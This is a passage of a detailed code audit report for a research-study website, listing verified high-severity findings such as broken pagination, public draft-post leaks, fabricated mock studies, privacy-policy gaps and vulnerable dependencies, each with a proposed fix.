# Hydrogen Studies — Full Code Audit & Enhancement Report

_Generated 2026-08-04 · branch `fix/seo-quick-wins` · multi-agent audit (276 agents, 14 dimensions + 5 gap areas, adversarial verification)_

## How to read this

Every finding below was independently **verified against the current working tree** — each auditor's claim was re-checked by 1–3 adversarial verifiers whose job was to refute it. Only findings a majority of verifiers **confirmed** in code are listed. 5 findings were thrown out as false positives (listed at the very end so you don't re-investigate them). Where a verifier disagreed with the auditor's severity, that's noted inline as "verifier suggests …".

Findings the July 2026 audit already fixed were excluded up front. Items carried over from July that are still open are tagged **[known]**.

## Scoreboard

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 37 |
| Medium | 85 |
| Low | 48 |
| **Total confirmed** | **170** |
| Refuted (false positives) | 5 |

No critical (actively-exploitable / data-loss-in-progress) issues survived verification — the security fundamentals fixed in July held. The volume is in **high/medium correctness bugs**: silently-broken pipelines, pagination that always returns page 1, jobs that reprocess the same rows forever, and a cluster of data-exposure and privacy/legal gaps.

## The nine themes that explain most of the 170 findings

**1. "Insert-then-return, then insert again" — the blog/study generation double-write.**
`blog-generator-enhanced.ts` saves each article _and_ returns it; three callers (`seo-routes`, `studies-controller`, `blog-routes`) re-insert the returned rows, colliding on the unique slug. The unique constraint prevents duplicate rows, but the collision is miscounted as a failure — so `generate-blogs` always reports `saved: 0`, pillar-cluster tagging never lands, and the real outcome is invisible. Pick one contract (generator persists _or_ caller persists) and fix all call sites together.

**2. Pagination is a no-op in four separate places.** Europe PMC search (`page` param the API ignores — needs `cursorMark`), advanced search (`client sends page`, `server reads offset`), admin studies table (`client reads totalPages`, `server sends pageCount`), and GA4 backfill (no offset paging, truncates at 100k). Every one of these silently shows only the first page / first slice of data. Individually small; together they mean "deeper results" mostly don't exist in this app.

**3. Background jobs reprocess the same rows forever.** Retraction monitor rechecks the same 50 studies every run (rest of catalog never checked); image-backfill and targeted-enrichment re-select permanently-failing rows every cycle (burning AI spend with no backoff/exclusion); internal-linking only ever touches the 200 lowest-id rows; `regenerate-content` phase 1 is a `while(true)` that retries failing studies indefinitely. These waste money and mask the fact that the long tail is never processed.

**4. Data exposure through under-guarded public endpoints.** Public `/api/blogs` serves **drafts and scheduled posts** to anonymous callers (and the public blog list renders them). The bot-prerender middleware prerenders draft/archived articles to crawlers. `/api/blogs` also returns full rows including internal `editorNotes`. Several "admin" datasets (trends dashboard, blog-job state, multi-format content) are reachable unauthenticated because they rely on a sibling router's mount order rather than their own `requireAdmin`.

**5. Fabricated / mislabeled study data reaching the public.** The by-consumer-category endpoint serves **fabricated studies with fake DOIs**; content-factory articles and study approvals attach content to "an arbitrary study (first row or id 1)"; study approval isn't idempotent, so re-approval **creates duplicate study rows**. For a research-credibility product these are reputational, not just technical.

**6. Privacy / legal exposure.** Ahrefs analytics loads **before consent** and isn't disclosed anywhere; the privacy policy names the wrong AI processor (health-topic questions go to Anthropic/xAI, not the stated OpenAI) and omits Klaviyo, Sentry, Ahrefs, Railway, Shopify; legal pages show a fake always-current "Last Updated" date; contact submissions and IP/UA logs are retained forever with no deletion path; the GDPR export omits several user-keyed tables. `package.json` even declares `"license": "MIT"` on a proprietary codebase.

**7. Content-licensing risk at scale.** Publisher full-text sections scraped via `doi.org` redirects and republished; Google Scholar scraped with a spoofed Chrome UA **by default**; copyrighted abstracts/figures stored and republished commercially with no license check; mandatory Semantic Scholar / Europe PMC attribution absent. This is a "get a lawyer's eyes on it" cluster, not a code bug.

**8. The test/CI safety net has holes.** E2E (8 specs, 100+ tests) **isn't wired into CI at all**; vitest runs with `--passWithNoTests` so a broken glob goes green with zero tests; the client component/page/hook layer can't even be discovered by the test runner; coverage is 8.85% with no thresholds; the admin-auth e2e test is tautological (passes even if auth is fully bypassed); `npm install` (not `npm ci`) in both CI and Railway; Node version differs across engines/CI/build-target/Railway.

**9. Dependency & bundle debt.** Six high-severity prod vulns fixable with a non-breaking `npm audit fix`; `sharp` and `exceljs` carry high CVEs; **[known]** `react-quill` pins XSS-vulnerable `quill 1.3.7` in the admin editor (stored-XSS path to public pages); a 463 kB recharts chunk is force-loaded on _every_ page; ~14,261 lines across 64 unreferenced files are dead; `studies.db` (a zero-byte SQLite remnant) sits in the repo root of a Postgres app.

## Suggested sequencing

- **This week (small, high-value):** force `isPublished` on public blog endpoints (#4); drop `--passWithNoTests` and switch to `npm ci`; run `npm audit fix` for the six non-breaking vulns; gate Ahrefs behind consent + fix the privacy-policy processor list; fix the four pagination bugs; delete `studies.db` and the dead files.
- **This sprint (medium):** resolve the generator double-write contract (#1); make study approval + the reprocessing jobs idempotent/bounded (#3, #5); wire e2e into CI and give the client test project a working include; replace `react-quill`; add `compression()` (ranked enhancement #1).
- **Needs a decision / outside eyes:** the content-licensing cluster (#7) and the full privacy/retention posture (#6) — these are legal/compliance calls, not just fixes.

The ranked **enhancement backlog** (12 items, quick wins first) is at the end, after the full findings.

---

## HIGH (37 findings)

### E2E suite (8 specs, 100+ tests) is not wired into CI at all

`.github/workflows/ci.yml:31` · high (verifier suggests medium) · effort: medium · auditor: tests-ci

The only workflow is ci.yml, whose steps are checkout, setup-node, npm install, tsc, build, and vitest. No job or workflow ever runs Playwright, and no browsers are installed. The e2e suite includes 64 substantive assertions on the Shopify proxy SSR routes (proxy-routes.spec.ts), legacy-redirect checks, and security-header checks — regressions in any of these ship silently.

Evidence: `ci.yml steps end at "run: npx vitest run --passWithNoTests"; grep playwright .github/workflows/ returns nothing`

**Fix:** Add a CI job: npx playwright install --with-deps chromium, provision a Postgres service or seeded SQLite/PGlite fixture, npm run build && npx playwright test --project=chromium. Gate PRs on it or run it on push to hydrogen-studies.

### CI runs vitest with --passWithNoTests, so a broken include glob turns CI green with zero tests

`.github/workflows/ci.yml:31` · high (verifier suggests medium) · effort: small · auditor: tests-ci

The test step is `npx vitest run --passWithNoTests`. The vitest projects use narrow include globs (server/__tests__/**/*.test.ts, client/src/**/__tests__/**/*.test.ts). If a directory is renamed, a glob typo lands, or a project config regresses (a dead-glob bug was already fixed once, commit 56afc09), vitest matches nothing and CI still passes. The flag converts silent test-discovery failure into a green build.

Evidence: `run: npx vitest run --passWithNoTests`

**Fix:** Drop --passWithNoTests (23 test files exist, the flag is obsolete). Optionally assert a minimum: vitest run then check reported file count, or set coverage thresholds so an empty run fails.

### Ahrefs analytics loads unconditionally before consent

`client/index.html:44` · high (verifier suggests medium) · effort: small · auditor: gap

The Ahrefs tracking script is hard-coded in index.html with an inline data-key and loads on every page view for every visitor, before and regardless of the cookie banner. GA4 is correctly gated behind hasAnalyticsConsent(), but Declining consent has zero effect on Ahrefs. For EU visitors this is a tracker firing pre-consent, and Ahrefs is not disclosed in the Privacy or Cookie Policy at all.

Evidence: `<script src="https://analytics.ahrefs.com/analytics.js" data-key="rjIt9UY/qFbTPzCzRK8BRg" async></script>`

**Fix:** Remove the static script tag; inject it dynamically from analytics.ts only when hasAnalyticsConsent() is true, mirroring the GA4 initGA() pattern, and add Ahrefs to the Cookie/Privacy policies.

### [known] Study create path POSTs to /api/studies but no POST route exists

`client/src/components/admin/StudyForm.tsx:103` · high (verifier suggests medium) · effort: medium · auditor: frontend-correctness

Re-verified: StudyForm's create branch does POST /api/studies, but server/controllers/studies-controller.ts registers only GET "/", PUT "/:id", DELETE "/:id" etc. — no post("/"). AddStudyPage (linked from the admin 'Add New Study' button) therefore always fails with a 404 ApiError toast; creating a study via the UI is impossible. Edit (PUT) works.

Evidence: `const endpoint = studyId ? /api/studies/${studyId} : "/api/studies"; const method = studyId ? "PUT" : "POST";`

**Fix:** Add router.post("/", requireAdmin, createStudy) in studies-controller with insertStudySchema validation, or remove/disable AddStudyPage until implemented.

### [known] react-quill 2.0.0 unmaintained, pins XSS-vulnerable quill 1.3.7 in the admin WYSIWYG editor

`client/src/components/ui/wysiwyg-editor.tsx:3` · high (verifier suggests low) · effort: medium · auditor: deps-build

Re-verified still open: react-quill (last published 2023-09, effectively abandoned) bundles quill 1.3.7 with two XSS advisories (GHSA-4943-9vgg-gr5r, GHSA-v3m3-f69x-jf25). wysiwyg-editor.tsx powers StudyForm, BlogAddPage, BlogEditPage — admin-authored HTML later rendered on public blog/study pages, so an editor-level XSS becomes stored XSS. No upstream fix exists (react-quill has no release supporting quill 2.x).

Evidence: `npm ls quill: "react-quill@2.0.0 └── quill@1.3.7"; npm view react-quill time.modified = '2023-09-24'`

**Fix:** Replace react-quill with TipTap (@tiptap/react + @tiptap/starter-kit, current 2.x) or Lexical (@lexical/react); both are maintained and React-18-native. Alternatively wrap quill 2.x directly in a small component. Then drop react-quill from package.json.

### Advanced-search pagination sends `page` but server only reads `offset` — every page shows page 1

`client/src/pages/EnhancedSearchPage.tsx:123` · high (verifier suggests medium) · effort: small · auditor: frontend-correctness

EnhancedSearchPage puts { ...filters, page, limit } in the queryKey and relies on the default queryFn to serialize them. The server handler for /api/search/enhanced computes pagination solely from req.query.offset (search-controller.ts:78) and ignores `page`. offset defaults to 0, so clicking Next/Prev on /advanced-search refetches and renders the identical first 12 results on every page.

Evidence: `queryKey: ["/api/search/enhanced", { ...filters, page, limit: RESULTS_PER_PAGE }] vs server: const offset = parseInt(String(req.query.offset || "0"))`

**Fix:** Send offset: (page - 1) * RESULTS_PER_PAGE in the key object, or make enhancedSearch accept a `page` param.

### Privacy policy names wrong AI processor: health questions go to Anthropic/xAI, not (only) OpenAI

`client/src/pages/PrivacyPolicyPage.tsx:128` · high (verifier suggests medium) · effort: small · auditor: gap

The chat widget sends free-text health questions (YMYL data) to Anthropic Claude as primary provider, OpenAI only as fallback, and xAI (Grok) for images (ai-provider.ts:5-14; chat-routes.ts:173 ai.generateText). The policy's sole AI section says queries "are processed by OpenAI". ChatWidget shows no notice that questions leave the site. Users cannot exercise informed consent about which processor receives potentially sensitive health queries.

Evidence: `PrivacyPolicyPage.tsx:128 "OpenAI API"; chat-routes.ts:173 "await ai.generateText(systemPrompt, userPrompt..."`

**Fix:** Rewrite the third-party AI section to name Anthropic (primary), OpenAI (fallback) and xAI, link their policies, and add a short in-widget notice that questions are processed by third-party AI providers.

### Legal pages omit or misstate every other actual processor (Klaviyo, Sentry, Ahrefs, Railway, Shopify)

`client/src/pages/PrivacyPolicyPage.tsx:150` · high · effort: medium · auditor: gap

The policy lists "SendGrid for email, PostgreSQL on Neon, Replit for hosting" — none reflect the deployed stack. Actual processors found in code and absent from Privacy, Cookie, and Terms pages: Klaviyo (newsletter + customer profiles on registration, auth-routes.ts:211 addCustomerProfile), Sentry client and server error tracking (error-tracking.ts:64, utils/sentry.ts), Ahrefs analytics (index.html:44), Railway hosting, Shopify webhooks (shopify-webhook-routes.ts). Cookie Policy's opt-out section covers only Google Analytics.

Evidence: `<li>SendGrid for email communications</li><li>PostgreSQL database hosted on Neon...</li><li>Replit for hosting...</li>`

**Fix:** Replace the third-party list with the real processor inventory (Klaviyo, Sentry, Ahrefs, GA4, Anthropic/OpenAI/xAI, Railway, Shopify) in Privacy and Cookie policies, with purpose and opt-out per processor.

### Admin studies pagination broken: client reads totalPages but API returns pageCount

`client/src/pages/admin/StudiesTable.tsx:131` · high (verifier suggests medium) · effort: small · auditor: frontend-correctness

StudiesTable computes totalPages from studiesQuery.data?.totalPages, but studyService.getStudies returns pageCount (server/services/study-service.ts:232) and the controller passes it through unchanged. totalPages is therefore always 1, so the pagination footer (rendered only when totalPages > 1) never appears. Admins can only ever see the first 50 studies; goToLastPage/goToNextPage clamp to 1.

Evidence: `const totalPages = studiesQuery.data?.totalPages || 1; ... server returns pageCount: Math.ceil(total / pageSize)`

**Fix:** Read pageCount: `const totalPages = studiesQuery.data?.pageCount || 1;` (or add totalPages server-side). Add a shared response type to prevent recurrence.

### Admin StudiesTable pagination dead: reads `totalPages`, server sends `pageCount`

`client/src/pages/admin/StudiesTable.tsx:131` · high (verifier suggests medium) · effort: small · auditor: api-contract

GET /api/studies returns PaginatedResults {data,total,page,pageSize,pageCount} (server/services/study-service.ts:46). StudiesTable reads `data?.totalPages || 1`, so totalPages is always 1: the pagination bar is hidden (`{totalPages > 1 && ...}`, line 549) and goToNextPage clamps to 1. Admins can only ever see/edit the first page of ~8.7k studies. Verified against prod: /api/studies envelope has pageCount, not totalPages. Public studies.tsx reads pageCount correctly — the key drifted from the blog endpoint's envelope.

Evidence: `const totalPages = studiesQuery.data?.totalPages || 1; // server: pageCount`

**Fix:** Read `studiesQuery.data?.pageCount` (or fall back: `pageCount ?? totalPages ?? Math.ceil(total/pageSize)`), and add a shared PaginatedResults<T> type in shared/ imported by both sides.

### Admin auth e2e test is tautological — passes even if admin auth is fully bypassed

`e2e/admin-pages.spec.ts:18` · high (verifier suggests medium) · effort: small · auditor: tests-ci

The 'admin dashboard redirects or blocks unauthenticated users' test accepts a login redirect OR the admin page itself as proof of protection: the isProtected expression includes body?.match(/admin|dashboard/i) with the comment 'Or it might show admin page if no auth is enforced'. An unauthenticated /admin render satisfies it, so the one e2e test guarding admin access can never detect an auth bypass. The sibling tests only assert absence of a 500.

Evidence: `// Or it might show admin page if no auth is enforced
      body?.match(/admin|dashboard/i);
    expect(isProtected).toBeTruthy();`

**Fix:** Assert the negative: expect body NOT to contain admin dashboard content, and expect either URL contains /login or an unauthorized message. Better: hit /api/admin/* with request context and assert 401/403 status codes.

### Six high-severity prod vulnerabilities fixable with non-breaking `npm audit fix`

`package.json:66` · high · effort: small · auditor: deps-build

npm audit --omit=dev reports 16 vulns (6 high) in runtime deps, most with non-breaking fixes: axios 1.16.1 (10 advisories: prototype pollution, DoS, maxBodyLength bypass; used by all server API clients via server/utils/http.ts), undici 7.28.0 (5 advisories, via cheerio/jsdom which sanitize fetched external HTML in server/utils/sanitize-html.ts), plus body-parser DoS, dompurify sanitizer bypass, ip-address SSRF-check bypass, brace-expansion DoS.

Evidence: `audit: "axios 1.0.0 - 1.17.0 Severity: high ... fix available via npm audit fix"; lockfile has axios 1.16.1, undici 7.28.0`

**Fix:** Run `npm audit fix` (no --force) and commit the lockfile: axios ->1.17.1+/1.19.0, undici ->7.28.1+, body-parser ->1.20.6, dompurify ->3.4.12+, ip-address, brace-expansion. All are semver-compatible with existing ranges.

### sharp 0.34.5 carries four high-severity libvips CVEs; fix is a breaking upgrade

`package.json:109` · high (verifier suggests medium) · effort: medium · auditor: deps-build

sharp <0.35.0 inherits libvips CVE-2026-33327/33328/35590/35591 (high). sharp decodes images server-side in server/services/comprehensive-image-system.ts, so malformed image input reaches the vulnerable native code. `npm audit fix` cannot resolve it; requires sharp 0.35.3 (breaking major-ish bump not covered by ^0.34.2).

Evidence: `audit: "sharp <0.35.0 Severity: high ... Will install sharp@0.35.3, which is a breaking change"`

**Fix:** Bump to "sharp": "^0.35.3", run the image-system code paths (resize/format calls) locally, and check the 0.35 changelog for API changes before deploying.

### Public by-consumer-category endpoint serves fabricated studies with fake DOIs

`server/controllers/studies-controller.ts:336` · high · effort: medium · auditor: services-r-z

GET /api/studies/by-consumer-category/:model/:category returns hardcoded mock studies (fake titles, authors, journals, and DOIs like 10.1234/hydro.2023.010) instead of querying the database. The client page ExploreByBenefit.tsx (line 147) consumes this endpoint, so real users on a scientific-credibility site are shown invented research presented as genuine studies.

Evidence: `const generateMockStudies = (categoryName: string) => { ... doi: 10.1234/hydro.2023.... }`

**Fix:** Replace generateMockStudies with a real query filtering studies by consumerCategories/healthConditions for the given model+category, or return 501 and hide the UI until implemented.

### generate-blogs endpoint re-inserts articles the generator already saved — always reports saved:0

`server/controllers/studies-controller.ts:707` · high (verifier suggests medium) · effort: small · auditor: services-r-z

generateBlogArticlesForStudy already inserts each article (blog-generator-enhanced.ts:273) — study-lifecycle.ts:150 even warns 'do NOT re-insert'. But the controller loops result.articles and inserts them again; every insert hits the unique slug constraint (schema.ts:935), is caught as code 23505, and pushed to warnings as 'Skipped duplicate'. The admin response is articles: [], saved: 0 even though generation succeeded, making the feature look broken.

Evidence: `const [saved] = await db.insert(blogArticles).values(article).returning(); ... if (dbError.code === "23505")`

**Fix:** Remove the re-insert loop in generateBlogs; return result.articles (already persisted) directly, mirroring the study-lifecycle call site.

### Public consumer-category endpoint serves fabricated studies with fake DOIs

`server/controllers/studies-controller.ts:336` · high · effort: medium · auditor: routes-utils

GET /api/studies/by-consumer-category/:model/:category (public, no auth) generates and returns five hardcoded fake studies per category — invented titles, authors, journals, DOIs (10.1234/hydro.2023.*), and ids 1000-1004 that collide with real study IDs. The live ExploreByBenefit page (client/src/pages/ExploreByBenefit.tsx:147) fetches and renders this as real research, undermining the site's credibility as an evidence database.

Evidence: `const mockStudies = generateMockStudies(category); res.json({ success: true, data: mockStudies });`

**Fix:** Replace the mock generator with a real query filtering studies by category/health_conditions (the same data renderConditionPage in seo-body-renderer already queries), or return an empty list until implemented.

### Batch AI endpoints run minutes of sequential work inside a 30s-timeout request

`server/controllers/studies-controller.ts:820` · high (verifier suggests medium) · effort: medium · auditor: routes-utils

POST /api/studies/batch-generate-tldrs loops up to 50 sequential Claude calls in-request (generateBlogs similarly runs multi-article generation). The global timeoutMiddleware (app.ts:194, error-handler.ts:400) sends a 504 at 30s but does not cancel the handler; the loop keeps burning AI spend, then res.json throws ERR_HTTP_HEADERS_SENT, its catch's res.status(500).json throws again, and the rejection lands in the process-level unhandledRejection handler. Admin never sees results/errors.

Evidence: `for (const study of studiesWithoutTldr) { ... const tldr = await generateStudyTldr(study, {`

**Fix:** Return 202 immediately and run the batch fire-and-forget with .catch, like /404s/backfill and the Shopify backfill endpoints do, or enqueue into content_generation_queue.

### Draft and archived blog articles are fully prerendered to crawlers

`server/middleware/seo-body-renderer.ts:286` · high · effort: small · auditor: gap

The crawler blog lookup omits is_published and is_archived filters in both the meta resolver (seo-bot-middleware.ts:114-124) and the body renderer, while every other query in these files filters is_published = true. Bots hitting /blog/<draft-slug> or enumerable /blog/<numeric-id> receive a 200, robots "index, follow", full draft body, and Article JSON-LD. Same bug class as the known public-blog-API draft leak; scheduled and soft-deleted posts stay crawlable and indexable.

Evidence: `FROM blog_articles WHERE slug = ${slugOrId} LIMIT 1 (no is_published; cf. line 146: WHERE is_published = true)`

**Fix:** Add AND is_published = true AND is_archived = false to the blog queries in renderBlog (both id and slug branches) and in resolvePageMeta's blog match, so unmatched drafts fall into the existing hard-404 content-path branch.

### injectMeta strips the Vite JS bundle and CSS from <head>; null-body pages serve bots a blank 200

`server/middleware/seo-bot-middleware.ts:474` · high · effort: medium · auditor: gap

The head-replacement regex replaces ALL head content, but the production build (dist/public/index.html) places the entry script and stylesheet inside <head>. Every bot-served page therefore has no app JS and no CSS. Whenever renderPageBody returns null (e.g. /this-week, /recent, condition slugs absent from health_conditions, body-system pages with zero matches), crawlers get a 200 "index, follow" page whose <div id="root"> is empty with no script to render anything — a blank thin page, cached 2h. The inline comment even says scripts/styles should be kept.

Evidence: `return html.replace(/<head>[\s\S]*?(?=<\/head>)/, newHead); // "but keep scripts/styles" — they are not kept`

**Fix:** Preserve the original <script>/<link rel="stylesheet">/<link rel="modulepreload"> tags when rebuilding head (extract them from the template and append to newHead), and return a 404/noindex instead of 200 when renderPageBody yields null for a recognized route.

### Any unknown URL returns 200 with homepage meta, self-canonical, and index,follow to bots

`server/middleware/seo-bot-middleware.ts:574` · high · effort: small · auditor: gap

For non-content paths with no meta match, the middleware falls back to homepage meta with canonical rewritten to the requested path and default robots "index, follow" (line 448), serves 200, and caches it. Combined with finding 2, the body is empty. This creates an infinite space of indexable duplicate-title blank pages (e.g. /any-junk-path), diverging from what humans see (SPA client-side 404) — classic soft-404/cloaking signal. Each unique junk path also occupies a slot in the 6000-entry LRU, evicting real prewarmed pages.

Evidence: `const effectiveMeta = meta || { ...fallbackMeta, canonical: ${SITE_URL}${req.path} }; ... setCachedBotHtml(req.path, enhancedHtml);`

**Fix:** For paths with no resolvable meta and no renderable body, serve the 404 branch (noindex, no-cache) instead of homepage-meta fallback; never cache fallback responses.

### Public /api/blogs endpoints expose unpublished draft and scheduled articles

`server/routes/blog-routes.ts:78` · high (verifier suggests medium) · effort: small · auditor: security-routes

GET /api/blogs (unauthenticated) only excludes archived rows by default — no isPublished filter — so drafts and scheduled posts are returned to anonymous callers; filterStatus=draft/scheduled/all is also honored. GET /api/blogs/:id (line 530) and /slug/:slug (line 491) return full rows regardless of isPublished. The public client/src/pages/BlogListPage.tsx fetches /api/blogs without filterStatus, so drafts actually render publicly; the admin BlogListPage relies on the same open endpoint.

Evidence: `if (filterStatus !== "archived" && filterStatus !== "all") { conditions.push(eq(blogArticles.isArchived, false)); }`

**Fix:** For unauthenticated requests, force isPublished=true (and reject draft/scheduled/all filterStatus values); require requireAdmin (or isAdminOrEditor) for non-published filters and for fetching unpublished rows in /:id and /slug/:slug.

### Public blog API serves unpublished drafts and scheduled posts

`server/routes/blog-routes.ts:108` · high · effort: small · auditor: api-contract

GET /api/blogs (no auth) only excludes archived rows by default — isPublished is never enforced, and `?filterStatus=draft|scheduled` is honored for anonymous callers (verified in prod: 2 drafts retrievable, full content). Default sort is createdAt desc, so a newly created draft appears at the top of the public /blog page (BlogListPage.tsx renders the list unfiltered, line 99). GET /api/blogs/slug/:slug and /:id (lines 491/530) also return drafts. Admin BlogListPage shares this endpoint, which is why the filter is loose.

Evidence: `if (filterStatus !== "archived" && filterStatus !== "all") { conditions.push(eq(blogArticles.isArchived, false)); }`

**Fix:** Default to isPublished=true and gate filterStatus draft/scheduled/archived (and unpublished slug/id reads) behind requireAdmin — e.g. check req.session admin before honoring non-published filters.

### Public unauthenticated endpoint triggers Opus synthesis with no rate limit

`server/routes/consensus-routes.ts:124` · high · effort: small · auditor: ai-cost

GET /api/consensus/topics/:slug is mounted with no auth and no rate limiter (app.ts:595 mounts the router bare) and calls synthesizeTopicEvidence, which fires a claude-opus-4-8 request (maxTokens 2000) plus a Consensus API search on every cache miss. The 24h cache is in-memory (cold on every deploy), concurrent misses stampede (no coalescing), and the error fallback (consensus-api.ts:358) is never cached, so during an AI failure every request re-fires Opus. Every other AI-triggering route uses requireAdmin+aiGenerationRateLimiter or chatRateLimiter.

Evidence: `router.get("/topics/:slug", async (req, res) => { ... await synthesizeTopicEvidence(...) } // model: MODELS.OPUS`

**Fix:** Add a public rate limiter (e.g. generalApiRateLimiter or a dedicated one) to /topics/:slug and /search, cache the error fallback with a short TTL, and coalesce concurrent in-flight synthesis per slug via a pending-promise map.

### regenerate-content --dry-run flag is ignored by phases 1, 3, and 4

`server/scripts/regenerate-content.ts:48` · high · effort: small · auditor: gap

The script advertises --dry-run, but only phases 1b, 2, and 5 check it. phase1_seoEnrichment (lines 48-85), phase3_linkBuilding, and phase4_keywordStrategy never reference dryRun. Running `regenerate-content.ts --dry-run` against production DATABASE_URL still performs full AI SEO enrichment with DB updates on every un-enriched study, rewrites internal links, and runs keyword clustering — exactly what a dry run exists to prevent.

Evidence: `phase1_seoEnrichment() body has no dryRun check; main(): if ((runAll || seoOnly) && startPhase <= 1) { results.phase1 = await phase1_seoEnrichment(); }`

**Fix:** Gate every phase on dryRun: in phases 1, 3, 4, count candidates and log what would happen, then return before calling batchEnrichStudies/buildAllStudyLinks/generateTopicClusters.

### Phase 1 while(true) loop retries permanently-failing studies forever — unbounded AI spend

`server/scripts/regenerate-content.ts:77` · high (verifier suggests medium) · effort: small · auditor: gap

Phase 1 loops until batchEnrichStudies returns total === 0. Candidates are selected by `enhancedWithAI IS NULL OR metaTitle IS NULL OR summary100Words IS NULL` (study-seo-enrichment.ts:212-234), and a failed enrichment writes nothing, so the same failing studies are re-fetched every iteration. If any batch of studies persistently fails (bad abstract, AI parse error), the loop never terminates and issues Anthropic calls indefinitely with no cost cap, max-batch limit, or failure exclusion.

Evidence: `while (true) { ... const result = await batchEnrichStudies({...}); ... if (result.total === 0) break; } — failed IDs stay NULL and are re-selected.`

**Fix:** Break when result.success === 0 (only failures remain), or track failed IDs and exclude them; add a max-iterations/max-cost guard.

### generateBlogArticlesForStudy both inserts rows AND returns them, causing guaranteed duplicate-key inserts at every re-inserting call site

`server/services/blog-generator-enhanced.ts:273` · high (verifier suggests medium) · effort: medium · auditor: services-a-e

generateSingleBlogArticle() persists each successful article to blog_articles itself, yet the function returns those same InsertBlogArticle objects (with their unique slug). Multiple callers loop over result.articles and insert them AGAIN, colliding on the unique slug. Only fallback (basic) articles are truly unsaved, so the contract is ambiguous and every genuinely-generated article double-inserts.

Evidence: `line 273 await db.insert(blogArticles).values(article); then return article; (298); seo-routes re-inserts each result.article`

**Fix:** Pick one contract: either have the generator NOT insert and let callers persist, or have it return saved rows/ids and stop callers from re-inserting. Update all call sites accordingly.

### Publisher full-text sections scraped via doi.org redirects and republished

`server/services/content-enrichment.ts:103` · high · effort: medium · auditor: gap

Enrichment fetches crossRefData.URL (a doi.org link) through an allowlist that includes doi.org, but axios follows 3 redirects onto arbitrary publisher sites, scrapes the article HTML, extracts Methods/Results/Conclusion sections (and Europe PMC fullTextXML sections at line 159), and writes them to studies.methods/results/conclusion, which are publicly republished. Full text is publisher-copyrighted even when the abstract is accessible; per-article licenses (incl. CC-BY-NC-ND in the OA subset) are never checked.

Evidence: `ALLOWED_ENRICHMENT_HOSTS has "doi.org"; fetchHtmlContent uses axios.get(url, { maxRedirects: 3 }); sections saved via db.update(studies).set({ methods..., results..., conclusion... })`

**Fix:** Remove doi.org/dx.doi.org from the allowlist (or set maxRedirects:0 and re-validate the final host). Only extract full-text sections from Europe PMC OA-subset articles whose license field permits commercial reuse; persist the license per study.

### Europe PMC search pagination is a no-op — every page returns the same first N results

`server/services/europepmc-api.ts:33` · high · effort: medium · auditor: services-a-e

searchEuropePMC passes `page` to Europe PMC's REST search, but that API ignores `page` and paginates only via cursorMark. Verified live: with resultType=core, page=1 and page=2 return identical article IDs. So 'next page' in search UIs and research-discovery-engine only ever see page 1, silently dropping all deeper results. europepmc-api-fixed.ts has the identical bug.

Evidence: `params { pageSize, page, ... } (l.30-35); live: page1 IDs 42446320,42190419 == page2 IDs 42446320,42190419`

**Fix:** Switch to cursorMark-based pagination (thread nextCursorMark through calls) or use the offset via a supported param; at minimum stop advertising a page arg that does nothing.

### Publisher-copyrighted abstracts stored and republished commercially at scale with no license check

`server/services/europepmc-api.ts:285` · high (verifier suggests medium) · effort: large · auditor: gap

Abstracts ingested from Europe PMC (resultType=core covers ALL indexed content, not the open-access subset), PubMed efetch XML (pubmed-enricher.ts:236), CrossRef (crossref-api.ts:160 — CrossRef's open-metadata terms explicitly exclude abstracts), and Semantic Scholar are stored in studies.abstract and rendered in full on public SEO pages (client/src/pages/SEOStudyPage.tsx:394) of a commercial site tied to a Shopify store. PubMed/Europe PMC abstracts carry publisher copyright; systematic commercial republication is unlicensed.

Evidence: `abstract: articleData.abstractText || "" ... sourcePlatform: "EuropePMC"; SEOStudyPage.tsx:394 renders {study.abstract} in full`

**Fix:** Get legal review; short-term: truncate public abstract display to a fair-use snippet with prominent link-out, or restrict full abstracts to sources/licenses that permit reuse (EPMC OA subset, CC-licensed preprints). Record source license per study.

### Google Scholar HTML scraping with spoofed Chrome UA runs automatically by default

`server/services/google-scholar-api.ts:123` · high (verifier suggests medium) · effort: small · auditor: gap

searchViaDirectHttp fetches scholar.google.com/scholar and regex-parses result HTML using a spoofed desktop Chrome User-Agent — a direct violation of Google's ToS which prohibit automated access. It is not admin-only: keyword-monitor-service.ts:209 includes "googlescholar" in the DEFAULT source list, and the job scheduler runs checkScheduledSearches every 15-minute tick, so whenever SERPAPI_KEY is unset the production Railway egress IP scrapes Scholar unattended, risking a Google IP block.

Evidence: `fetchWithTimeout(https://scholar.google.com/scholar?${params}, { headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0...) Chrome/120.0.0.0..." } }); default sources = [..., "googlescholar"]`

**Fix:** Delete searchViaDirectHttp entirely; make the Scholar source a no-op (or error) when SERPAPI_KEY is absent, and remove "googlescholar" from the default scheduled-source list.

### Recommendation engine interpolates arrays as single SQL params — matching broken, latent 500

`server/services/recommendation-engine.ts:331` · high (verifier suggests medium) · effort: small · auditor: services-g-r

Drizzle sql`` binds each interpolation as ONE parameter. `ARRAY[${arr.map(b=>`'${b}'`).join(",")}]` becomes a one-element array whose value contains literal quotes, so && overlap conditions (lines 232, 239, 246, 331, 337, 343) never match — the live /api/studies/:id/recommendations 'similar' endpoint degrades to category-only. Worse, `id NOT IN (${viewedStudies.join(",")})` (223, 322, 391) binds '1,2' as one text param; with 2+ viewed studies Postgres throws an int-cast error and the endpoint 500s.

Evidence: `sql${studies.healthBenefits} && ARRAY[${target.healthBenefits.map((b) => '${b}').join(",")}]`

**Fix:** Use drizzle's inArray/notInArray helpers and `sql`ARRAY[${sql.join(items.map(i=>sql`${i}`), sql`,`)}]::text[]`` (as recommendation.ts's getRecentlyViewedStudies already does) instead of string-joining values into a single placeholder.

### Weekly digest generated for the wrong (current) week, then idempotency-locks the empty result

`server/services/research-digest-generator.ts:19` · high · effort: small · auditor: services-r-z

getCurrentWeekBounds returns the Monday–Sunday window containing 'now'. The scheduler runs the job on Mondays (job-scheduler.ts:1309), so the digest covers the week that just started — near-zero studies — and the empty 'No new studies were added this week' digest is published (isPublished: true) and permanently locked by digestExistsForWeek. First run after a deploy on any weekday likewise freezes a partial-week digest. Published weekly digests are systematically empty or truncated.

Evidence: `const now = new Date(); ... return { weekStart: monday.toISOString().split("T")[0], ... }`

**Fix:** Generate the digest for the previous completed week (subtract 7 days before computing bounds), and only auto-create the empty placeholder once that week has actually ended.

### Retraction monitor rechecks the same 50 studies forever; rest of catalog never checked

`server/services/retraction-monitor.ts:264` · high (verifier suggests medium) · effort: medium · auditor: services-r-z

